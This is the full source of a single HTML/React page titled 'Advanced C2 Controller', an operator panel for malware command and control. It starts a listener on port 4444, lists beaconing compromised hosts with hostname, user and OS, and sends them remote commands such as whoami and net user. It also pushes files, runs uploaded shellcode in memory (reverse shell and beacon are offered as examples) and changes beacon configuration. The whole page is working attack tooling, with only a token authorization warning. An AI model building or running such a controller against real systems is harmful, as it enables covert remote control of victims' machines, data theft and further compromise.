<!DOCTYPE html>
<html>
<head>
    <title>C2 Controller</title>
    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        button { background: #007acc; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin: 5px; }
        button:hover { background: #005a9e; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        input, select { padding: 8px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; }
        .status { margin: 10px 0; padding: 10px; border-radius: 4px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
        .client-list { list-style: none; padding: 0; }
        .client-item { padding: 10px; margin: 5px 0; background: #f8f9fa; border-radius: 3px; border-left: 4px solid #007acc; }
        .client-info { font-size: 0.9em; color: #666; margin-top: 5px; }
        .client-id { font-weight: bold; color: #333; }
        .client-ip { color: #007acc; }
        .client-status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
        .online { background: #28a745; }
        .offline { background: #dc3545; }
        .command-output { background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 4px; font-family: monospace; margin: 10px 0; max-height: 200px; overflow-y: auto; }
        .message-list { max-height: 400px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px; padding: 10px; margin-top: 10px; }
        .message-item { padding: 8px; margin: 5px 0; background: #f8f9fa; border-radius: 3px; border-left: 4px solid #007acc; }
        .message-header { display: flex; justify-content: space-between; font-size: 0.9em; margin-bottom: 5px; }
        .message-time { color: #666; font-size: 0.8em; }
        .message-content { font-family: monospace; white-space: pre-wrap; background: white; padding: 5px; border-radius: 2px; }
        .tab-container { margin: 15px 0; }
        .tab-buttons { display: flex; border-bottom: 1px solid #ddd; }
        .tab-button { padding: 10px 20px; background: #f8f9fa; border: none; border-bottom: 2px solid transparent; cursor: pointer; }
        .tab-button.active { background: white; border-bottom: 2px solid #007acc; font-weight: bold; }
        .tab-content { padding: 15px 0; }
        .shellcode-warning { background: #fff3cd; border: 1px solid #ffc107; padding: 10px; border-radius: 4px; margin: 10px 0; }
        .danger-zone { border: 2px solid #dc3545; background: #f8f7f7; }
        .danger-zone h3 { color: #dc3545; }
    </style>
</head>
<body>
    <div id="root"></div>
    
    <script type="text/babel">
        function App() {
            const [status, setStatus] = React.useState('');
            const [clients, setClients] = React.useState([]);
            const [selectedClient, setSelectedClient] = React.useState('');
            const [command, setCommand] = React.useState('');
            const [selectedFile, setSelectedFile] = React.useState(null);
            const [selectedShellcodeFile, setSelectedShellcodeFile] = React.useState(null);
            const [clientInfo, setClientInfo] = React.useState(null);
            const [clientMessages, setClientMessages] = React.useState([]);
            const [activeTab, setActiveTab] = React.useState('commands');
            const [configUpdate, setConfigUpdate] = React.useState('');
            
            const startListener = async () => {
                try {
                    const result = await fetch('http://localhost:8080/start-listener', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({})
                    });
                    const data = await result.json();
                    setStatus(data.status);
                } catch (error) {
                    setStatus('Error: ' + error.message);
                }
            };
            
            const refreshClients = async () => {
                try {
                    const result = await fetch('http://localhost:8080/get-clients');
                    const data = await result.json();
                    setClients(data);
                    if (data.length > 0 && !selectedClient) {
                        setSelectedClient(data[0].IPAddress);
                    }
                } catch (error) {
                    console.error('Error fetching clients:', error);
                }
            };
            
            const getClientInfo = async (clientIP) => {
                try {
                    const result = await fetch(`http://localhost:8080/get-client-info?client=${clientIP}`);
                    const data = await result.json();
                    setClientInfo(data);
                } catch (error) {
                    console.error('Error fetching client info:', error);
                    setClientInfo(null);
                }
            };
            
            const fetchClientMessages = async (clientIP) => {
                try {
                    const result = await fetch(`http://localhost:8080/get-client-messages?client=${clientIP}`);
                    const data = await result.json();
                    setClientMessages(data.messages || []);
                } catch (error) {
                    console.error('Error fetching messages:', error);
                    setClientMessages([]);
                }
            };
            
            const sendCommand = async () => {
                if (!selectedClient || !command) return;
                
                try {
                    const result = await fetch('http://localhost:8080/send-command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client: selectedClient,
                            command: command
                        })
                    });
                    const data = await result.json();
                    setStatus(data.status);
                    setCommand('');
                    
                    // Clear previous messages and wait for real response
                    setClientMessages([]);
                    setStatus('‚úÖ Command sent - waiting for response...');
                    
                } catch (error) {
                    setStatus('Error: ' + error.message);
                }
            };
            
            const sendBinary = async () => {
                if (!selectedClient || !selectedFile) return;
                
                const formData = new FormData();
                formData.append('client', selectedClient);
                formData.append('binaryFile', selectedFile);
                
                try {
                    const result = await fetch('http://localhost:8080/send-binary', {
                        method: 'POST',
                        body: formData
                    });
                    const data = await result.json();
                    setStatus(data.status);
                    setSelectedFile(null);
                    document.getElementById('binary-input').value = '';
                } catch (error) {
                    setStatus('Error: ' + error.message);
                }
            };

            // NEW: Send shellcode function
            const sendShellcode = async () => {
                if (!selectedClient || !selectedShellcodeFile) {
                    setStatus('‚ùå Please select a client and shellcode file');
                    return;
                }

                if (!window.confirm('‚ö†Ô∏è DANGER: Executing shellcode can crash the target system or cause unexpected behavior. Are you sure you want to continue?')) {
                    setStatus('Shellcode execution cancelled');
                    return;
                }
                
                const formData = new FormData();
                formData.append('client', selectedClient);
                formData.append('shellcodeFile', selectedShellcodeFile);
                
                try {
                    const result = await fetch('http://localhost:8080/send-shellcode', {
                        method: 'POST',
                        body: formData
                    });
                    const data = await result.json();
                    setStatus(data.status);
                    setSelectedShellcodeFile(null);
                    document.getElementById('shellcode-input').value = '';
                } catch (error) {
                    setStatus('Error: ' + error.message);
                }
            };

            // NEW: Update client configuration
            const updateConfig = async () => {
                if (!selectedClient || !configUpdate.trim()) return;
                
                try {
                    const result = await fetch('http://localhost:8080/update-config', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client: selectedClient,
                            config: configUpdate
                        })
                    });
                    const data = await result.json();
                    setStatus(data.status);
                    setConfigUpdate('');
                } catch (error) {
                    setStatus('Error: ' + error.message);
                }
            };
            
            const handleFileSelect = (event) => {
                setSelectedFile(event.target.files[0]);
            };

            const handleShellcodeFileSelect = (event) => {
                setSelectedShellcodeFile(event.target.files[0]);
            };
            
            const handleClientSelect = (clientIP) => {
                setSelectedClient(clientIP);
                getClientInfo(clientIP);
                fetchClientMessages(clientIP);
            };
            
            const refreshMessages = async () => {
                if (selectedClient) {
                    await fetchClientMessages(selectedClient);
                }
            };
            
            const getStatusClass = () => {
                if (status.includes('‚úÖ') || status.includes('Listener started')) return 'success';
                if (status.includes('‚ùå') || status.includes('Error')) return 'error';
                if (status.includes('‚ö†Ô∏è') || status.includes('DANGER')) return 'warning';
                return '';
            };
            
            const formatLastSeen = (lastSeen) => {
                if (!lastSeen) return 'Unknown';
                const date = new Date(lastSeen);
                return date.toLocaleString();
            };
            
            const formatMessageTime = (timestamp) => {
                const date = new Date(timestamp);
                return date.toLocaleTimeString();
            };

            // Quick shellcode examples
            const loadExampleShellcode = (exampleName) => {
                setStatus(`‚ö†Ô∏è ${exampleName} - Remember to upload actual shellcode file`);
                // In a real implementation, you might pre-load example shellcode files
            };
            
            // Auto-refresh clients every 5 seconds
            React.useEffect(() => {
                refreshClients();
                const clientInterval = setInterval(refreshClients, 5000);
                return () => clearInterval(clientInterval);
            }, []);
            
            // Auto-refresh messages for selected client every 2 seconds
            React.useEffect(() => {
                if (selectedClient) {
                    const messageInterval = setInterval(refreshMessages, 2000);
                    return () => clearInterval(messageInterval);
                }
            }, [selectedClient]);
            
            return (
                <div className="container">
                    <h1>üñ•Ô∏è Advanced C2 Controller</h1>
                    
                    <div className="section">
                        <button onClick={startListener}>Start C2 Listener on Port 4444</button>
                        <button onClick={refreshClients}>Refresh Clients</button>
                    </div>
                    
                    <div className="section">
                        <h3>üîó Connected Clients:</h3>
                        {clients.length === 0 ? (
                            <p>No clients connected. Start listener and wait for beacons...</p>
                        ) : (
                            <div className="client-list">
                                {clients.map(client => (
                                    <div key={client.IPAddress} className="client-item">
                                        <div>
                                            <span className="client-status online"></span>
                                            <span className="client-id">{client.ID}</span>
                                            <span className="client-ip"> ({client.IPAddress})</span>
                                        </div>
                                        <div className="client-info">
                                            Last seen: {formatLastSeen(client.LastSeen)}
                                            {client.SystemInfo && client.SystemInfo.Hostname && (
                                                <div>
                                                    System: {client.SystemInfo.Hostname} | 
                                                    User: {client.SystemInfo.User} | 
                                                    OS: {client.SystemInfo.OS} {client.SystemInfo.Arch}
                                                </div>
                                            )}
                                        </div>
                                        <button 
                                            onClick={() => handleClientSelect(client.IPAddress)}
                                            style={{fontSize: '0.8em', padding: '4px 8px'}}
                                        >
                                            Select
                                        </button>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                    
                    {selectedClient && (
                        <div className="section">
                            <h3>üéØ Selected Client: {selectedClient}</h3>
                            {clientInfo && (
                                <div style={{background: '#f8f9fa', padding: '10px', borderRadius: '4px'}}>
                                    <strong>System Information:</strong>
                                    <div>Hostname: {clientInfo.Hostname || 'Unknown'}</div>
                                    <div>User: {clientInfo.User || 'Unknown'}</div>
                                    <div>OS: {clientInfo.OS || 'Unknown'} {clientInfo.Arch || ''}</div>
                                </div>
                            )}
                            
                            <div style={{marginTop: '15px'}}>
                                <h4>üì® Client Messages:</h4>
                                <button onClick={refreshMessages}>Refresh Messages</button>
                                <div className="message-list">
                                    {clientMessages.length === 0 ? (
                                        <p>No messages yet. Send a command to see results.</p>
                                    ) : (
                                        clientMessages.map((msg, index) => (
                                            <div key={index} className="message-item">
                                                <div className="message-header">
                                                    <strong>{msg.type}</strong> 
                                                    <span className="message-time">
                                                        {formatMessageTime(msg.timestamp)}
                                                    </span>
                                                </div>
                                                <div className="message-content">
                                                    {msg.content || `Binary data: ${msg.data_size} bytes`}
                                                </div>
                                            </div>
                                        ))
                                    )}
                                </div>
                            </div>
                        </div>
                    )}
                    
                    {/* Tab Interface for different operations */}
                    <div className="section">
                        <div className="tab-container">
                            <div className="tab-buttons">
                                <button 
                                    className={`tab-button ${activeTab === 'commands' ? 'active' : ''}`}
                                    onClick={() => setActiveTab('commands')}
                                >
                                    üìù Commands
                                </button>
                                <button 
                                    className={`tab-button ${activeTab === 'files' ? 'active' : ''}`}
                                    onClick={() => setActiveTab('files')}
                                >
                                    üì¶ File Transfer
                                </button>
                                <button 
                                    className={`tab-button ${activeTab === 'shellcode' ? 'active' : ''}`}
                                    onClick={() => setActiveTab('shellcode')}
                                >
                                    ‚ö° Shellcode
                                </button>
                                <button 
                                    className={`tab-button ${activeTab === 'config' ? 'active' : ''}`}
                                    onClick={() => setActiveTab('config')}
                                >
                                    ‚öôÔ∏è Configuration
                                </button>
                            </div>
                            
                            <div className="tab-content">
                                {/* Commands Tab */}
                                {activeTab === 'commands' && (
                                    <div>
                                        <h3>üìù Execute Commands:</h3>
                                        <select 
                                            value={selectedClient} 
                                            onChange={(e) => handleClientSelect(e.target.value)}
                                        >
                                            <option value="">Select Client</option>
                                            {clients.map(client => (
                                                <option key={client.IPAddress} value={client.IPAddress}>
                                                    {client.ID} ({client.IPAddress})
                                                </option>
                                            ))}
                                        </select>
                                        <input 
                                            type="text" 
                                            value={command}
                                            onChange={(e) => setCommand(e.target.value)}
                                            placeholder="Enter command (e.g., whoami, ipconfig, dir)"
                                            style={{width: '300px'}}
                                            onKeyPress={(e) => e.key === 'Enter' && sendCommand()}
                                        />
                                        <button onClick={sendCommand} disabled={!selectedClient || !command}>
                                            Send Command
                                        </button>
                                        
                                        <div style={{marginTop: '15px'}}>
                                            <h4>‚ö° Quick Commands:</h4>
                                            <button onClick={() => setCommand('whoami')}>whoami</button>
                                            <button onClick={() => setCommand('ipconfig /all')}>ipconfig</button>
                                            <button onClick={() => setCommand('systeminfo')}>systeminfo</button>
                                            <button onClick={() => setCommand('dir C:\\')}>dir C:\</button>
                                            <button onClick={() => setCommand('netstat -an')}>netstat</button>
                                            <button onClick={() => setCommand('tasklist')}>tasklist</button>
                                            <button onClick={() => setCommand('net user')}>net user</button>
                                        </div>
                                    </div>
                                )}
                                
                                {/* File Transfer Tab */}
                                {activeTab === 'files' && (
                                    <div>
                                        <h3>üì¶ File Transfer:</h3>
                                        <select 
                                            value={selectedClient} 
                                            onChange={(e) => handleClientSelect(e.target.value)}
                                        >
                                            <option value="">Select Client</option>
                                            {clients.map(client => (
                                                <option key={client.IPAddress} value={client.IPAddress}>
                                                    {client.ID} ({client.IPAddress})
                                                </option>
                                            ))}
                                        </select>
                                        <input 
                                            id="binary-input"
                                            type="file" 
                                            onChange={handleFileSelect}
                                        />
                                        <button onClick={sendBinary} disabled={!selectedClient || !selectedFile}>
                                            Send File to Client
                                        </button>
                                        {selectedFile && (
                                            <div style={{marginTop: '10px'}}>
                                                <strong>Selected:</strong> {selectedFile.name} 
                                                ({(selectedFile.size / 1024).toFixed(2)} KB)
                                            </div>
                                        )}
                                        <p style={{fontSize: '0.9em', color: '#666', marginTop: '10px'}}>
                                            üìÅ Files will be downloaded to the client's current directory
                                        </p>
                                    </div>
                                )}
                                
                                {/* Shellcode Tab */}
                                {activeTab === 'shellcode' && (
                                    <div className="danger-zone">
                                        <h3>‚ö° Shellcode Execution</h3>
                                        <div className="shellcode-warning">
                                            <strong>‚ö†Ô∏è WARNING: DANGEROUS OPERATION</strong><br/>
                                            ‚Ä¢ Shellcode executes directly in memory<br/>
                                            ‚Ä¢ Can crash the target system<br/>
                                            ‚Ä¢ May trigger antivirus detection<br/>
                                            ‚Ä¢ Use only with proper authorization
                                        </div>
                                        
                                        <select 
                                            value={selectedClient} 
                                            onChange={(e) => handleClientSelect(e.target.value)}
                                        >
                                            <option value="">Select Client</option>
                                            {clients.map(client => (
                                                <option key={client.IPAddress} value={client.IPAddress}>
                                                    {client.ID} ({client.IPAddress}) - {client.SystemInfo?.OS}
                                                </option>
                                            ))}
                                        </select>
                                        <input 
                                            id="shellcode-input"
                                            type="file" 
                                            onChange={handleShellcodeFileSelect}
                                            accept=".bin,.raw,.sc,.txt"
                                        />
                                        <button 
                                            onClick={sendShellcode} 
                                            disabled={!selectedClient || !selectedShellcodeFile}
                                            style={{background: '#dc3545'}}
                                        >
                                            üöÄ Execute Shellcode
                                        </button>
                                        
                                        {selectedShellcodeFile && (
                                            <div style={{marginTop: '10px'}}>
                                                <strong>Selected Shellcode:</strong> {selectedShellcodeFile.name} 
                                                ({(selectedShellcodeFile.size / 1024).toFixed(2)} KB)
                                            </div>
                                        )}
                                        
                                        <div style={{marginTop: '15px'}}>
                                            <h4>üí° Example Shellcode Types:</h4>
                                            <button onClick={() => loadExampleShellcode('MessageBox')}>MessageBox</button>
                                            <button onClick={() => loadExampleShellcode('Calc')}>Calculator</button>
                                            <button onClick={() => loadExampleShellcode('Reverse Shell')}>Reverse Shell</button>
                                            <button onClick={() => loadExampleShellcode('Beacon')}>Beacon</button>
                                        </div>
                                        
                                        <p style={{fontSize: '0.8em', color: '#666', marginTop: '10px'}}>
                                            üìã Upload raw binary shellcode files (.bin, .raw) or text format
                                        </p>
                                    </div>
                                )}
                                
                                {/* Configuration Tab */}
                                {activeTab === 'config' && (
                                    <div>
                                        <h3>‚öôÔ∏è Client Configuration:</h3>
                                        <select 
                                            value={selectedClient} 
                                            onChange={(e) => handleClientSelect(e.target.value)}
                                        >
                                            <option value="">Select Client</option>
                                            {clients.map(client => (
                                                <option key={client.IPAddress} value={client.IPAddress}>
                                                    {client.ID} ({client.IPAddress})
                                                </option>
                                            ))}
                                        </select>
                                        <textarea 
                                            value={configUpdate}
                                            onChange={(e) => setConfigUpdate(e.target.value)}
                                            placeholder="Enter configuration (JSON format recommended)"
                                            style={{width: '100%', height: '100px', padding: '10px', margin: '10px 0'}}
                                        />
                                        <button onClick={updateConfig} disabled={!selectedClient || !configUpdate.trim()}>
                                            Update Configuration
                                        </button>
                                        <p style={{fontSize: '0.9em', color: '#666'}}>
                                            üìã Send configuration updates to the client (beacon intervals, C2 settings, etc.)
                                        </p>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                    
                    {status && (
                        <div className={`status ${getStatusClass()}`}>
                            <strong>Status:</strong> {status}
                        </div>
                    )}
                </div>
            );
        }
        
        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>